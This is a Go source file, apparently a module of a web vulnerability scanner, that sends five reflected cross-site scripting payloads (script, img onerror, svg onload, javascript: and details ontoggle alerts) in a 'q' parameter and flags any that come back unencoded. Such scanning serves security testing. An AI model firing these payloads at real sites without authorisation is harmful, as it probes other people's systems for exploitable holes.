package modules

import (
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"
	"tunnelrat/internal/core" // Importando seu core para o tipo Result
)

// Payloads avançados para bypass
var payloads = []string{
	"<script>alert(1)</script>",
	"\"><img src=x onerror=alert(1)>",
	"'><svg/onload=alert(1)>",
	"javascript:alert(1)",
	"<details open ontoggle=confirm(1)>",
}

// XSS agora segue o padrão que o seu app.go espera
func XSS(targetURL string) core.Result {
	client := &http.Client{
		Timeout: 3 * time.Second,
	}

	// Como o XSS precisa de um parâmetro, vamos testar um padrão comum 'q' 
	// ou você pode ajustar para receber o parâmetro desejado.
	param := "q" 
	
	for _, p := range payloads {
		// Monta a URL de teste
		testURL := fmt.Sprintf("%s?%s=%s", targetURL, param, p)
		
		resp, err := client.Get(testURL)
		if err != nil {
			continue
		}
		defer resp.Body.Close()

		body, _ := io.ReadAll(resp.Body)
		content := string(body)

		// Se o payload for refletido sem encoding, é vulnerável
		if strings.Contains(content, p) {
			return core.Result{
				Module: "XSS",
				Found:  true,
				Detail: fmt.Sprintf("Vulnerável com payload: %s no parâmetro: %s", p, param),
			}
		}
	}

	return core.Result{
		Module: "XSS",
		Found:  false,
	}
}